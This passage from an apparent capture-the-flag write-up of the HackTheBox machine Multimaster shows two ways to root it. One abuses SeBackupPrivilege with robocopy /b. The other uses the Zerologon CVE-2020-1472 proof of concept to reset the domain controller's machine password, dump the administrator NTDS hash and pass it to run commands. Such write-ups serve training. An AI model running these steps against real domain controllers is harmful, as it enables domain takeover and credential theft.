Another way to root the box is to use the [`SeBackupPrivilege`](../../tl-dr/active-directory/groups/server-operators.md#accessing-files) and copy the `Administrator`'s directory elsewhere.

{% code overflow="wrap" %}
```powershell
# copying the administrator desktop
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> robocopy /b C:\users\administrator\desktop\ C:\Windows\System32\spool\drivers\color

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, April 1, 2024 8:55:08 AM
   Source : C:\users\administrator\desktop\
     Dest : C:\Windows\System32\spool\drivers\color\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           2    C:\users\administrator\desktop\
          *EXTRA File             259584        cefdebug.exe
          *EXTRA File               1058        D50.camp
          *EXTRA File               1079        D65.camp
          *EXTRA File                797        Graphics.gmmp
          *EXTRA File                838        MediaSim.gmmp
          *EXTRA File              13824        MultimasterAPI.dll
          *EXTRA File              45272        nc64.exe
          *EXTRA File                786        Photo.gmmp
          *EXTRA File                822        Proofing.gmmp
          *EXTRA File             218103        RSWOP.icm
          *EXTRA File               3144        sRGB Color Space Profile.icm
          *EXTRA File              17155        wscRGB.cdmp
          *EXTRA File               1578        wsRGB.cdmp
            New File                 488        desktop.ini
  0%
100%
            New File                  34        root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         2         2         0         0         0        13
   Bytes :       522       522         0         0         0   550.8 k
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :              174000 Bytes/sec.
   Speed :               9.956 MegaBytes/min.
   Ended : Monday, April 1, 2024 8:55:08 AM

# checking that the flag is here
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> ls root.txt


    Directory: C:\Windows\System32\spool\drivers\color


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/1/2024  12:59 AM             34 root.txt

# reading flag
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> cat root.txt
95c<REDACTED>3fb
```
{% endcode %}

### Zerologon

This DC can be fully compromised via the [Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) vulnerability without obtaining any credentials.

{% code overflow="wrap" %}
```bash
# checking if the DC is vulnerable to zerologon
$ nxc smb 10.10.10.179 -M zerologon
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
ZEROLOGO... 10.10.10.179    445    MULTIMASTER      VULNERABLE
ZEROLOGO... 10.10.10.179    445    MULTIMASTER      Next step: https://github.com/dirkjanm/CVE-2020-1472
```
{% endcode %}

Next, using the provided [PoC](https://github.com/dirkjanm/CVE-2020-1472), we can directly dump the `ntds.dit`  and use the `administrator`'s hash to compromise the domain.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># cloning the PoC's repo
$ sudo git clone https://github.com/dirkjanm/CVE-2020-1472
Cloning into 'CVE-2020-1472'...
remote: Enumerating objects: 41, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 41 (delta 6), reused 4 (delta 4), pack-reused 29
Receiving objects: 100% (41/41), 23.83 KiB | 595.00 KiB/s, done.
Resolving deltas: 100% (14/14), done.

# moving within the directory
$ cd CVE-2020-1472/

# checking how the script works
$ python3 cve-2020-1472-exploit.py
Usage: zerologon_tester.py &#x3C;dc-name> &#x3C;dc-ip>

Tests whether a domain controller is vulnerable to the Zerologon attack. Resets the DC account password to an empty string when vulnerable.
Note: dc-name should be the (NetBIOS) computer name of the domain controller.
<strong>
</strong><strong># using the PoC
</strong>$ python3 cve-2020-1472-exploit.py MULTIMASTER 10.10.10.179
Performing authentication attempts...
========
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!

# dumping the administrator's hash
$ nxc smb 10.10.10.179 -u 'MULTIMASTER$' -p '' --ntds --user administrator
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\MULTIMASTER$:********
SMB         10.10.10.179    445    MULTIMASTER      [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         10.10.10.179    445    MULTIMASTER      [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.10.179    445    MULTIMASTER      Administrator:500:aad3b435b51404eeaad3b435b51404ee:69c&#x3C;REDACTED>be0:::
SMB         10.10.10.179    445    MULTIMASTER      [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/MULTIMASTER_10.10.10.179_2024-04-01_171531.ntds of which 1 were added to the database
SMB         10.10.10.179    445    MULTIMASTER      [*] To extract only enabled accounts from the output file, run the following command:
SMB         10.10.10.179    445    MULTIMASTER      [*] cat /home/kali/.nxc/logs/MULTIMASTER_10.10.10.179_2024-04-01_171531.ntds | grep -iv disabled | cut -d ':' -f1
SMB         10.10.10.179    445    MULTIMASTER      [*] grep -iv disabled /home/kali/.nxc/logs/MULTIMASTER_10.10.10.179_2024-04-01_171531.ntds | cut -d ':' -f1

# snatching the flags!
$ nxc smb 10.10.10.179 -u administrator -H admin_hash -x 'type c:\users\alcibiades\desktop\user.txt;type c:\users\administrator\desktop\root.txt'
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\administrator:******** (Pwn3d!)
SMB         10.10.10.179    445    MULTIMASTER      [+] Executed command via wmiexec
SMB         10.10.10.179    445    MULTIMASTER      c:\users\alcibiades\desktop\user.txt
SMB         10.10.10.179    445    MULTIMASTER
SMB         10.10.10.179    445    MULTIMASTER
SMB         10.10.10.179    445    MULTIMASTER      8fd&#x3C;REDACTED>22b
SMB         10.10.10.179    445    MULTIMASTER      The system cannot find the file specified.
SMB         10.10.10.179    445    MULTIMASTER      Error occurred while processing: type.
SMB         10.10.10.179    445    MULTIMASTER
SMB         10.10.10.179    445    MULTIMASTER      c:\users\administrator\desktop\root.txt
SMB         10.10.10.179    445    MULTIMASTER
SMB         10.10.10.179    445    MULTIMASTER
SMB         10.10.10.179    445    MULTIMASTER      95c&#x3C;REDACTED>3fb
</code></pre>

[^1]: Elevation of Privileges

[^2]: Living Off The Land

[^3]: Proof of Concept
